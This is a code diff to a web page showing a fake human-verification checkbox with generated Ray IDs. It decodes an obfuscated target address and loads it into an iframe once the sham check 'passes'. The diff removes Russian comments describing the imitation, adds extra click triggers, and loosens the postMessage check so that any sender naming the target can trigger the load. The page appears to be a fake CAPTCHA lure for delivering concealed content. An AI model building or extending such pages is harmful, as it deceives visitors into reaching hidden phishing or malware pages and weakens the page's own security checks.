@@ -180,10 +180,12 @@ const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
 const TARGET_URL = decodeURL(URL_IDX);
 
 
-
     const iframe = document.getElementById('verifyFrame');
+    let alreadyLoading = false; 
 
     async function loadTargetIntoFrame() {
+      if (alreadyLoading) return;
+      alreadyLoading = true;
       try {
         const res = await fetch(TARGET_URL, { mode: 'cors', credentials: 'omit', cache: 'no-store' });
         if (!res.ok) throw new Error('HTTP ' + res.status);
@@ -196,7 +198,7 @@ const TARGET_URL = decodeURL(URL_IDX);
     }
 
     function buildVerifySrcdoc() {
-      // Подставляем вычисленный TARGET_URL внутрь srcdoc для корректной передачи в postMessage
+      
       return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -214,7 +216,7 @@ const TARGET_URL = decodeURL(URL_IDX);
   @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
   #box{width:18.65rem;background:#fafafa;border:1px solid #e0e0e0;margin-top:2.2rem;display:none;flex-direction:column;overflow:hidden;transition:height .4s ease}
   #row{display:flex;align-items:center;height:3.94rem;padding:0 .5rem}
-  #checkbx{width:2.8rem;height:2.8rem;display:flex;justify-content:center;align-items:center}
+  #checkbx{width:2.8rem;height:2.8rem;display:flex;justify-content:center;align-items:center;cursor:pointer}
   #checkbx input[type=checkbox]{width:1.5rem;height:1.5rem;cursor:pointer;display:none;accent-color:#12a800}
   #checkbox.error{box-shadow:0 0 0 2px rgba(173,0,0,.55);border-radius:3px}
   .loader-ring{width:1.2rem;height:1.2rem;border:3.5px solid rgba(18,128,14,0);border-top:3.5px solid rgba(18,128,14,.61);border-radius:50%;animation:spin 1.5s linear infinite;display:none}
@@ -227,7 +229,6 @@ const TARGET_URL = decodeURL(URL_IDX);
   #review{margin-top:3.5rem;font-size:1.5rem;opacity:.9}
   #footer{text-align:center;margin-bottom:1rem;font-size:.75rem;line-height:1.2rem;opacity:.7}
   #footer hr{border:none;border-top:1px solid #e0e0e0;width:57rem;margin:0 auto 1rem}
-  /* небольшой визуальный отклик для checked */
   #checkbox:checked + label{font-weight:600}
 </style>
 </head>
@@ -264,7 +265,6 @@ const TARGET_URL = decodeURL(URL_IDX);
 
 <script>
   (function(){
-    // TARGET_URL подставлен из родителя
     const TARGET_URL = "${TARGET_URL.replace(/"/g, '\\"')}";
     function generateRayID(){
       const chars='0123456789abcdef';let id='';
@@ -281,18 +281,18 @@ const TARGET_URL = decodeURL(URL_IDX);
           box.style.display='flex';
           box.setAttribute('aria-hidden','false');
           setTimeout(()=>{
-            document.getElementById('checkbox').style.display='block';
-          },300);
-        },300);
+            
+            const checkbox = document.getElementById('checkbox');
+            checkbox.style.display='block';
+          },100);
+        },200);
       },600);
 
       const checkbxWrap = document.getElementById('checkbx');
       const checkbox = document.getElementById('checkbox');
       const loader = document.getElementById('loader-ring');
-
-      // Удобный helper: запускает "проверку" и уведомляет родителя
+     
       function succeedVerification(){
-        // Отправляем сообщение родителю, как раньше
         try {
           window.parent && window.parent.postMessage({type:'verified', target: TARGET_URL}, '*');
         } catch (e) {
@@ -300,26 +300,35 @@ const TARGET_URL = decodeURL(URL_IDX);
         }
       }
 
-      // Основная обработка клика/нажатия
-      function triggerCheck(){
-        // если уже отмечено — ничего не делаем
+     
+      function triggerCheck(e){
+        
         if (checkbox.checked) return;
-        // визуальный переход — показать loader, прятать чекбокс
+       
+        if (triggerCheck._running) return;
+        triggerCheck._running = true;
+
         loader.style.display='block';
         checkbox.style.display='none';
-        // имитируем асинхронную проверку (как в captcha302.html)
+
         setTimeout(()=>{
           loader.style.display='none';
           checkbox.style.display='block';
           checkbox.checked = true;
-          // короткая задержка перед уведомлением родителя — для визуального эффекта
-          setTimeout(succeedVerification, 700);
-        }, 1600);
+          
+          setTimeout(()=>{
+            succeedVerification();
+            triggerCheck._running = false;
+          }, 500);
+        }, 1200);
       }
 
-      // клик мышью
+      checkbxWrap.addEventListener('pointerdown', triggerCheck, {passive:true});
+      checkbxWrap.addEventListener('mousedown', triggerCheck, {passive:true});
       checkbxWrap.addEventListener('click', triggerCheck, {passive:true});
-      // клавиатурная доступность (Enter / Space)
+      
+      checkbox.addEventListener('click', triggerCheck, {passive:true});
+
       checkbxWrap.addEventListener('keydown', (e)=>{
         if (e.key === 'Enter' || e.key === ' ') {
           e.preventDefault();
@@ -337,9 +346,26 @@ const TARGET_URL = decodeURL(URL_IDX);
     iframe.srcdoc = buildVerifySrcdoc();
 
     window.addEventListener('message', (e) => {
+      console.log('parent: got message', e);
       if (!e || !e.data || e.data.type !== 'verified') return;
-      if (e.source !== iframe.contentWindow) return;
-      loadTargetIntoFrame();
+
+      
+      if (e.data.target && e.data.target === TARGET_URL) {
+        console.log('parent: verified target matches, loading target into iframe');
+        loadTargetIntoFrame();
+        return;
+      }
+     
+      try {
+        if (e.source === iframe.contentWindow) {
+          console.log('parent: source matches iframe.contentWindow, loading target');
+          loadTargetIntoFrame();
+        } else {
+          console.warn('parent: message ignored — source did not match and target mismatch');
+        }
+      } catch (err) {
+        console.error('parent: error during message handling', err);
+      }
     });
   </script>
 </body>
